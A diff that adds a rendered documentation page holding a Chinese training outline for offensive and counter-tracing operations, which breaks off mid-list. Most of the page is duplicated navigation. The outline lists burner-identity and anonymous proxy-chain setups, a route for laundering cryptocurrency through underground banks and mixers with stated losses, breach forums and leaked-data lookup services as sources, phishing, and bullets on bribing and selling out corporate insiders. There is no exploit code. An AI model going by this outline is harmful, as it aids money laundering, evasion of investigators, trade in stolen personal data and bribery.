+    <span class="md-ellipsis">
+      
+        （反)溯源技巧
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="（反)溯源技巧">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        工作环境配置
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="工作环境配置">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        主机硬盘加密
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        虚拟机环境配置
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        个人信息清理
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        安卓虚拟机+实体机
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        在对谁进行反溯源
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        做了哪些链路
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        链路每一跳泄露了哪些信息
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        谁能拿到这些信息
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        时间成本？
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        需要的权限
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        网络环境配置
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="网络环境配置">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        匿名工作链路配置
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        渗透环境及工具配置
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="渗透环境及工具配置">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        创建账号
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        工具
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        字典
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#httpslcxccpost3213" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        https://lcx.cc/post/3213/
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_20" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        包网
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="包网">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        金主-&gt;提供建站服务/开发
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_21" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        反间防谍
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="反间防谍">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_22" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        商业间谍(内容已删除)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_23" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        地缘对抗|不同政体间谍（内容已删除）
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_24" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        信息收集
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="信息收集">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_25" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        网站信息收集
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="网站信息收集">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sgk" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        sgk 数据来源收集
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_26" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        拿到站看什么
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_27" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        开源信息收集
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_28" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        供应链信息收集
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#osint" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        osint 信息收集
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bypass-cdn" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        bypass cdn
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_29" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        建站公司实战溯源
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="建站公司实战溯源">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BC 包网溯源
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_30" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        团伙人员信息溯源
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_31" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        渗透打击突破思路及方法
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="渗透打击突破思路及方法">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_32" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        黑盒快速打点思路
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_33" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        常见漏洞原理及利用工具与思路
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_34" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        痕迹清理
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_35" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        **代码审计 **
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="**代码审计 **">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#java" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实战 java 代码审计
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="实战 java 代码审计">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bc-getshell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BC 站源码审计 getshell 实战
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cp-getshell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        cp 站源码审计 getshell 实战
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#java_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        java反序列化
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#php" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实战 php 代码审计
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="实战 php 代码审计">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bc-getshell_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BC 站源码审计 getshell 实战
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        （反)溯源技巧
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="（反)溯源技巧">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        工作环境配置
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="工作环境配置">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        主机硬盘加密
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        虚拟机环境配置
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        个人信息清理
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        安卓虚拟机+实体机
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        在对谁进行反溯源
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        做了哪些链路
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        链路每一跳泄露了哪些信息
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        谁能拿到这些信息
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        时间成本？
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        需要的权限
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        网络环境配置
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="网络环境配置">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        匿名工作链路配置
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        渗透环境及工具配置
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="渗透环境及工具配置">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        创建账号
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        工具
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        字典
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#httpslcxccpost3213" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        https://lcx.cc/post/3213/
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_20" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        包网
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="包网">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        金主-&gt;提供建站服务/开发
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_21" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        反间防谍
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="反间防谍">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_22" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        商业间谍(内容已删除)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_23" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        地缘对抗|不同政体间谍（内容已删除）
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_24" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        信息收集
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="信息收集">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_25" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        网站信息收集
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="网站信息收集">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sgk" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        sgk 数据来源收集
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_26" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        拿到站看什么
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_27" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        开源信息收集
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_28" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        供应链信息收集
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#osint" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        osint 信息收集
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bypass-cdn" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        bypass cdn
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_29" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        建站公司实战溯源
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="建站公司实战溯源">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BC 包网溯源
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_30" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        团伙人员信息溯源
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_31" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        渗透打击突破思路及方法
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="渗透打击突破思路及方法">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_32" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        黑盒快速打点思路
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_33" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        常见漏洞原理及利用工具与思路
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_34" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        痕迹清理
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_35" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        **代码审计 **
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="**代码审计 **">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#java" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实战 java 代码审计
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="实战 java 代码审计">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bc-getshell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BC 站源码审计 getshell 实战
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cp-getshell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        cp 站源码审计 getshell 实战
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#java_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        java反序列化
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#php" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实战 php 代码审计
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="实战 php 代码审计">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bc-getshell_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BC 站源码审计 getshell 实战
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="_1">蓝军培训大纲</h1>
+<blockquote>
+<p>来源: 飞书文档思维导图</p>
+</blockquote>
+<h2 id="_2">（反)溯源技巧</h2>
+<h3 id="_3">工作环境配置</h3>
+<h4 id="_4">主机硬盘加密</h4>
+<ul>
+<li>veracrypt</li>
+<li><a href="https://www.veracrypt.fr/en/Downloads.html">https://www.veracrypt.fr/en/Downloads.html</a></li>
+</ul>
+<h4 id="_5">虚拟机环境配置</h4>
+<ul>
+<li>删掉蓝牙、NAT网卡</li>
+<li>shadow defender</li>
+<li>共享文件夹挂载放置文件</li>
+<li>渗透机和报告机分开</li>
+<li>wps不允许同步文档</li>
+<li>mybase</li>
+<li>keepass</li>
+</ul>
+<h4 id="_6">个人信息清理</h4>
+<ul>
+<li>不允许使用个人id</li>
+<li>不允许使用历史密码</li>
+<li>不允许使用历史账号</li>
+<li>账号一次一扔</li>
+<li>创建匿名邮箱</li>
+<li>protonmail<ul>
+<li><a href="https://protonmail.com/">https://protonmail.com/</a></li>
+</ul>
+</li>
+<li>outlook<ul>
+<li><a href="https://www.microsoft.com/zh-cn/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook?deeplink=%2fowa%2f&amp;sdf=0">https://www.microsoft.com/zh-cn/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook?deeplink=%2fowa%2f&amp;sdf=0</a></li>
+</ul>
+</li>
+<li>创建接码平台账号</li>
+<li><a href="https://sms-activate.io/">https://sms-activate.io/</a></li>
+<li>设备购买（二手）</li>
+<li>设备id</li>
+<li>wifi bssid<ul>
+<li>netsh wlan show networks mode=bssid</li>
+</ul>
+</li>
+<li>手机卡购买</li>
+<li>线下</li>
+<li>副卡</li>
+<li>tg购买</li>
+<li>no自己手机号</li>
+<li>虚拟币</li>
+<li>冷钱包/现金（境内地下钱庄交易）-&gt;u-&gt;多币种混币-&gt;u<ul>
+<li>匿名洗钱损耗7%-10%</li>
+<li>洗钱公司、地下钱庄加上佣金损耗在30%</li>
+</ul>
+</li>
+</ul>
+<h4 id="_7">安卓虚拟机+实体机</h4>
+<h4 id="_8">在对谁进行反溯源</h4>
+<ul>
+<li>bc包网</li>
+<li>ip<ul>
+<li>账号</li>
+</ul>
+</li>
+</ul>
+<h4 id="_9">做了哪些链路</h4>
+<h4 id="_10">链路每一跳泄露了哪些信息</h4>
+<h4 id="_11">谁能拿到这些信息</h4>
+<h4 id="_12">时间成本？</h4>
+<h4 id="_13">需要的权限</h4>
+<h3 id="_14">网络环境配置</h3>
+<h4 id="_15">匿名工作链路配置</h4>
+<ul>
+<li>匿名主机环境选购</li>
+<li>非大陆地区<ul>
+<li>shockhosting</li>
+<li><a href="http://psychz.net">psychz.net</a></li>
+<li>no香港阿里云</li>
+<li>亚马逊云</li>
+<li>cf</li>
+<li>jtti.cc</li>
+</ul>
+</li>
+<li>最好支持usdt</li>
+<li>主机不选择同一主机商</li>
+<li>链路搭建</li>
+<li>境外流量卡-&gt;frp-&gt;softether vpn-&gt;lunaproxy(动态住宅代理)</li>
+<li><a href="https://github.com/SoftEtherVPN/SoftEtherVPN_Stable">https://github.com/SoftEtherVPN/SoftEtherVPN_Stable</a></li>
+<li>境外流量卡-&gt;lunaproxy-&gt;流量代理<ul>
+<li><a href="https://suying999.net/auth/login">https://suying999.net/auth/login</a></li>
+</ul>
+</li>
+<li>境内流量卡-&gt;softether vpn-&gt;流量代理</li>
+<li>匿名流量设备</li>
+<li>vpn配置及痕迹清理</li>
+</ul>
+<h3 id="_16">渗透环境及工具配置</h3>
+<h4 id="_17">创建账号</h4>
+<ul>
+<li>github</li>
+<li><a href="https://securitytrails.com/">https://securitytrails.com/</a></li>
+<li>全球最大情报商</li>
+<li><a href="https://search.censys.io/">https://search.censys.io/</a></li>
+<li>每天更新<ul>
+<li>rustscan</li>
+</ul>
+</li>
+<li>fofa/hunter（不允许实战虚拟机内登录）</li>
+</ul>
+<h4 id="_18">工具</h4>
+<ul>
+<li>ffuf</li>
+<li>网盘打包</li>
+<li><a href="https://pan.baidu.com/s/1AL9YxaSvh0TpfBtnWe_LCw?pwd=431d">https://pan.baidu.com/s/1AL9YxaSvh0TpfBtnWe_LCw?pwd=431d</a></li>
+</ul>
+<h4 id="_19">字典</h4>
+<ul>
+<li><a href="https://github.com/9bie/dict">https://github.com/9bie/dict</a></li>
+<li><a href="https://github.com/SexyBeast233/SecDictionary">https://github.com/SexyBeast233/SecDictionary</a></li>
+<li><a href="https://github.com/r00tSe7en/MyDict">https://github.com/r00tSe7en/MyDict</a></li>
+</ul>
+<h3 id="httpslcxccpost3213"><a href="https://lcx.cc/post/3213/">https://lcx.cc/post/3213/</a></h3>
+<h3 id="_20">包网</h3>
+<h4 id="-">金主-&gt;提供建站服务/开发</h4>
+<ul>
+<li>代码+搭建</li>
+<li>代码+搭建+运维</li>
+<li>自建站</li>
+<li>bc-&gt;页面关联一大批站点</li>
+</ul>
+<h3 id="_21">反间防谍</h3>
+<h4 id="_22">商业间谍(内容已删除)</h4>
+<ul>
+<li>如何买通内鬼</li>
+<li>商业咨询公司套路</li>
+<li>如何卖掉内鬼</li>
+<li>如何查处内鬼</li>
+<li>料子上下游分析溯源</li>
+</ul>
+<h4 id="_23">地缘对抗|不同政体间谍（内容已删除）</h4>
+<h2 id="_24"><strong>信息收集</strong></h2>
+<h3 id="_25">网站信息收集</h3>
+<h4 id="sgk">sgk 数据来源收集</h4>
+<ul>
+<li><a href="https://breachforums.st/member?action=login">https://breachforums.st/member?action=login</a></li>
+<li>potato</li>
+<li>蝙蝠</li>
+<li>海鸥</li>
+<li>事密达</li>
+<li>tg</li>
+<li>买临时账号刷社工库次数</li>
+<li>signal</li>
+<li>discord</li>
+<li>whatsapp</li>
+<li>Jabber</li>
+<li>session</li>
+<li>matrix</li>
+<li>simplex</li>
+</ul>
+<h4 id="_26">拿到站看什么</h4>
+<ul>
+<li>paramspider做字典</li>
+<li>to do</li>
+</ul>
+<h4 id="_27">开源信息收集</h4>
+<ul>
+<li>github</li>
+<li>关键字<ul>
+<li>ldap</li>
+<li>结合域名资产信息<ul>
+<li>内网资产信息</li>
+</ul>
+</li>
+<li>login</li>
+<li>小业务</li>
+<li>项目关联-&gt;账号下的信息</li>
+<li>拼音（缩写）</li>
+<li>子域名</li>
+<li>内网域名</li>
+<li>com.xxx</li>
+<li>中文</li>
+<li>js/css/html/特殊文件名</li>
+</ul>
+</li>
+<li>人物关联<ul>
+<li>star</li>
+<li>fork</li>
+<li>commit</li>
+<li>follow</li>
+</ul>
+</li>
+<li><a href="https://securitytrails.com/">https://securitytrails.com/</a></li>
+<li>子域名</li>
+<li>fofa/hunter/...</li>
+<li>ico</li>
+<li>title</li>
+<li>body</li>
+<li>找源码<ul>
+<li>扫备份</li>
+<li>黑盒-&gt;白盒</li>
+</ul>
+</li>
+<li>gitee/看云/语雀/<a href="http://hackmd.io/石墨">hackmd.io/石墨</a></li>
+<li>site:"<a href="http://yuque.com">yuque.com</a>" "xxx"</li>
+<li>新闻</li>
+<li><a href="https://sigma.world/zh-hant/cis/floor-plan/">https://sigma.world/zh-hant/cis/floor-plan/</a></li>
+<li>google语法</li>
+<li>duckduckgo<ul>
+<li>site:<a href="http://xxx.com">xxx.com</a> -www -fare -css -parking</li>
+</ul>
+</li>
+<li>hackone/<a href="https://zeroday.hitcon.org/">https://zeroday.hitcon.org/</a></li>
+<li>Twitter/facebook/linkin</li>
+<li>员工<ul>
+<li>初始密码有规则</li>
+</ul>
+</li>
+<li>网盘</li>
+<li>第三方</li>
+<li>medium</li>
+<li>不强制<ul>
+<li>开会员</li>
+</ul>
+</li>
+</ul>
+<h4 id="_28">供应链信息收集</h4>
+<ul>
+<li>供应商大会</li>
+<li>海外企业</li>
+<li>招投标</li>
+<li>页面特征</li>
+<li>js/css/html</li>
+</ul>
+<h4 id="osint">osint 信息收集</h4>
+<ul>
+<li><a href="https://securitytrails.com/">https://securitytrails.com/</a></li>
+<li><a href="https://search.censys.io/">https://search.censys.io/</a></li>
+<li>每天扫端口<ul>
+<li>时效性很强</li>
+<li>但是偶尔会有遗漏，不全</li>
+</ul>
+</li>
+<li>rapid7 dns</li>
+<li>本地搭建clickhouse</li>
+<li><a href="https://idc.ip138.com/idc/">https://idc.ip138.com/idc/</a></li>
+<li>asn</li>
+<li>页面特征找源码</li>
+<li>接口特征找源码</li>
+<li>联系方式找源码</li>
+</ul>
+<h4 id="bypass-cdn">bypass cdn</h4>
+<ul>
+<li>页面特征找真实ip</li>
+<li>历史解析找真实ip</li>
+<li>其他业务关联ip段找真实ip</li>
+</ul>
+<h3 id="_29">建站公司实战溯源</h3>
+<h4 id="bc">BC 包网溯源</h4>
+<ul>
+<li>同cdn</li>
+<li>同dns</li>
+<li>同机房</li>
+<li>同页面特征找测试站域名ip关联到包网</li>
+<li>同关键字特征域名模糊搜索</li>
+<li>找客服对模版</li>
+</ul>
+<h4 id="_30">团伙人员信息溯源</h4>
+<ul>
+<li>历史发帖关联账号</li>
+<li>特殊id</li>
+<li>sgk</li>
+<li>文件元数据</li>
+<li>钓鱼</li>
+</ul>
+<h3 id="_31">渗透打击突破思路及方法</h3>
+<h4 id="_32">黑盒快速打点思路</h4>
+<ul>
+<li>BC 站点</li>
+<li>_<ul>
